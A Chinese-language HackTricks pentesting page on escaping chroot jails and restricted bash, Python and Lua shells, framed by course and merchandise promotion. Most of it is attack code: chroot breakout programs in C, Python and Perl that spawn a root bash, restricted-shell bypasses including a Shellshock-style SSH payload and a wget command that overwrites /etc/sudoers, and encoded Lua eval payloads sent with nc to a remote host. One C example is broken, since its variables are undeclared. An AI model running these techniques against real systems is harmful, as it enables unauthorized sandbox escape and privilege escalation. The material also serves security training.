# 逃离监狱环境

<details>

<summary><strong>从零开始学习AWS黑客攻击直至成为专家，通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF版本**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在**Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

## **GTFOBins**

**在** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **搜索是否可以执行任何具有"Shell"属性的二进制文件**

## Chroot逃逸

来自[wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations)：Chroot机制**不旨在防御**有意篡改的**特权**（**root**）**用户**。在大多数系统上，chroot上下文不能正确堆叠，具有足够权限的chroot程序**可以执行第二次chroot以逃脱**。\
通常这意味着要逃脱，你需要在chroot内部成为root。

{% hint style="success" %}
**工具** [**chw00t**](https://github.com/earthquake/chw00t) 被创建来滥用以下场景并从`chroot`中逃脱。
{% endhint %}

### Root + CWD

{% hint style="warning" %}
如果你在chroot内部是**root**，你**可以逃脱**创建**另一个chroot**。这是因为在Linux中，两个chroots不能共存，所以如果你创建一个文件夹，然后在这个新文件夹上**创建一个新的chroot**，并且**你在它外面**，你现在将会**在新chroot的外面**，因此你将会在文件系统中。

这是因为通常chroot**不会**将你的工作目录移动到指定的目录，所以你可以创建一个chroot但在外面。
{% endhint %}

通常你不会在chroot监狱内找到`chroot`二进制文件，但你**可以编译、上传并执行**一个二进制文件：

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
<details>

<summary>Perl</summary>

</details>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + 已保存的文件描述符

{% hint style="warning" %}
这种情况与前一个案例类似，但在这种情况下，**攻击者存储了一个指向当前目录的文件描述符**，然后**在新文件夹中创建chroot**。最后，由于他可以**访问**那个**FD**，并且该FD位于chroot**之外**，他访问它并且**逃逸**。
{% endhint %}

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

{% hint style="warning" %}
FD 可以通过 Unix Domain Sockets 传递，因此：

* 创建子进程 (fork)
* 创建 UDS 以便父子进程通信
* 在子进程中运行 chroot 到不同文件夹
* 在父进程中创建一个 FD，指向子进程 chroot 外的文件夹
* 通过 UDS 将该 FD 传递给子进程
* 子进程 chdir 到该 FD，由于它位于其 chroot 外部，它将逃离监狱
{% endhint %}

### Root + Mount

{% hint style="warning" %}
* 将根设备 (/) 挂载到 chroot 内部的目录中
* Chroot 进入该目录

这在 Linux 中是可能的
{% endhint %}

### Root + /proc

{% hint style="warning" %}
* 将 procfs 挂载到 chroot 内部的目录中（如果尚未挂载）
* 寻找具有不同 root/cwd 条目的 pid，例如：/proc/1/root
* Chroot 进入该条目
{% endhint %}

### Root(?) + Fork

{% hint style="warning" %}
* 创建 Fork（子进程）并 chroot 进入文件系统更深层的不同文件夹，并在其中 CD
* 从父进程中，将子进程所在的文件夹移动到子进程 chroot 之前的文件夹
* 这个子进程将发现自己在 chroot 外部
{% endhint %}

### ptrace

{% hint style="warning" %}
* 过去用户可以从其自身的进程中调试自己的进程... 但这默认不再可能
* 无论如何，如果可能，你可以 ptrace 进入一个进程并在其中执行 shellcode（[参见此示例](linux-capabilities.md#cap_sys_ptrace)）。
{% endhint %}

## Bash 监狱

### 枚举

获取关于监狱的信息：
```bash
echo $SHELL
echo $PATH
env
export
pwd
```
### 修改 PATH

检查是否可以修改 PATH 环境变量
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### 使用 vim
```bash
:set shell=/bin/sh
:shell
```
### 创建脚本

检查是否可以创建一个内容为 _/bin/bash_ 的可执行文件
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### 通过 SSH 获取 bash

如果您通过 ssh 访问，可以使用这个技巧来执行一个 bash shell：
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
### 声明
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

你可以覆盖例如sudoers文件
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### 其他技巧

以下页面包含了关于逃离受限Linux shell的技巧：

[**https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)\
[https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
[https://gtfobins.github.io](https://gtfobins.github.io)\
**以下页面也可能有趣：**

{% content-ref url="../useful-linux-commands/bypass-bash-restrictions.md" %}
[bypass-bash-restrictions.md](../useful-linux-commands/bypass-bash-restrictions.md)
{% endcontent-ref %}

## Python 监狱

关于逃离Python监狱的技巧，请参阅以下页面：

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

## Lua 监狱

在此页面中，你可以找到在Lua中可以访问的全局函数：[https://www.gammon.com.au/scripts/doc.php?general=lua\_base](https://www.gammon.com.au/scripts/doc.php?general=lua\_base)

**使用命令执行的Eval：**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
一些**不使用点调用库函数**的技巧：
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
列举库的函数：
```bash
for k,v in pairs(string) do print(k,v) end
```
请注意，每次在**不同的lua环境中执行前面的单行命令时，函数的顺序都会改变**。因此，如果您需要执行一个特定的函数，您可以通过加载不同的lua环境并调用库的第一个函数来执行暴力破解攻击：
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**获取交互式lua shell**：如果你处于一个受限的lua shell中，你可以通过以下方式调用来获取一个新的lua shell（希望是无限制的）：
```bash
debug.debug()
```
## 参考资料

* [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (幻灯片: [https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf))

<details>

<summary><strong>通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>从零开始学习AWS黑客攻击技巧！</strong></summary>

支持HackTricks的其他方式：

* 如果您希望在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF版本**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方的PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。**

</details>
